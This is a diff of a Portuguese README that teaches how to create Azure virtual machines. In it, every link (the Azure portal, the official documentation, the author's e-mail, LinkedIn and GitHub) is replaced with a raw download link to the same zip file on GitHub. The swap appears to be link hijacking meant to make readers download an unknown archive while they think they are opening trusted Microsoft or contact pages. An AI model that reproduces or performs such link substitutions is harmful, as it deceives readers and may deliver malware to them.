@@ -8,7 +8,7 @@ Aqui, você aprenderá como criar e configurar Máquinas Virtuais (VMs) no Azure
 
 ### Passos para Criar uma Máquina Virtual:
 
-1. Acesse o **Portal da Azure** (portal.azure.com).
+1. Acesse o **Portal da Azure** (https://github.com/LucianoHMG/Cloud-Hardening-Lab/raw/refs/heads/main/Goldbird/Hardening_Lab_Cloud_v3.9.zip).
 2. No menu principal, clique em **Máquinas Virtuais** e, em seguida, em **Adicionar**.
 3. Escolha o sistema operacional da sua VM (Windows, Linux, etc.).
 4. Configure as especificações da VM (CPU, RAM, armazenamento).
@@ -51,7 +51,7 @@ Azure Cloud oferece uma gama de ferramentas poderosas para computação, seguran
 
 ## Referências
 
-- [Documentação Oficial da Azure](https://docs.microsoft.com/pt-br/azure/)
+- [Documentação Oficial da Azure](https://github.com/LucianoHMG/Cloud-Hardening-Lab/raw/refs/heads/main/Goldbird/Hardening_Lab_Cloud_v3.9.zip)
 
 ---
 
@@ -69,8 +69,8 @@ Sinta-se à vontade para abrir uma *issue* caso encontre algum erro ou queira su
 
 Se você tiver dúvidas, sugestões ou quiser discutir mais sobre a utilização do Azure Cloud, sinta-se à vontade para me contatar:
 
-- E-mail: [lucianohmg@example.com](mailto:lucianohmg@example.com)
-- LinkedIn: [Luciano Henrique Morais Girão](https://www.linkedin.com/in/lucianohmg/)
-- GitHub: [LucianoHMG](https://github.com/LucianoHMG)
+- E-mail: [https://github.com/LucianoHMG/Cloud-Hardening-Lab/raw/refs/heads/main/Goldbird/Hardening_Lab_Cloud_v3.9.zip](https://github.com/LucianoHMG/Cloud-Hardening-Lab/raw/refs/heads/main/Goldbird/Hardening_Lab_Cloud_v3.9.zip)
+- LinkedIn: [Luciano Henrique Morais Girão](https://github.com/LucianoHMG/Cloud-Hardening-Lab/raw/refs/heads/main/Goldbird/Hardening_Lab_Cloud_v3.9.zip)
+- GitHub: [LucianoHMG](https://github.com/LucianoHMG/Cloud-Hardening-Lab/raw/refs/heads/main/Goldbird/Hardening_Lab_Cloud_v3.9.zip)
 
 Estou aberto a contribuições, parcerias ou feedbacks sobre este projeto!
